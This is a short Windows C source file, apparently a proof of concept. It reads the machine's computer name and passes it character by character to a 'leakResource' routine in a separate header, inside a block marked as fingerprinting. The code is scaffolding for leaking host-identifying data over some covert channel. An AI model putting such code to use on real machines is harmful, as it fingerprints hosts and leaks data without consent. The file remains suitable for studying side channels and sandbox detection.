#include <windows.h>

void leakResource(int num);
void* readConfig(void);
void * memcpymyas(void* dst, const void* src, unsigned int cnt);
size_t mystrlen(const char * str);

int WINAPI WinMain(HINSTANCE a,HINSTANCE b,LPSTR c,int d){
    int* data = (int*)readConfig(); // first int is the start index, second is the end index

    /* BEGIN FINGERPRINTING */ 
    unsigned char pc_name[256];
    DWORD size = 256;
    GetComputerNameA(pc_name, &size);
    MessageBoxA(0, pc_name, 0, 0);
    for(int i = data[0]; i < data[1]; i++){
        if(pc_name[i] == '\0'){
            return 0;
        }
        leakResource(pc_name[i]);
    }

    /* END FINGERPRINTING */

    ExitProcess(0);
    return 0;
}

// I can't seem to get mingw32-gcc to change the entrypoint of the binary (when compiling
// without the standard library. Hence, the entry point defaults to the first function
// so we must include at the bottom.
#include "leaker.h"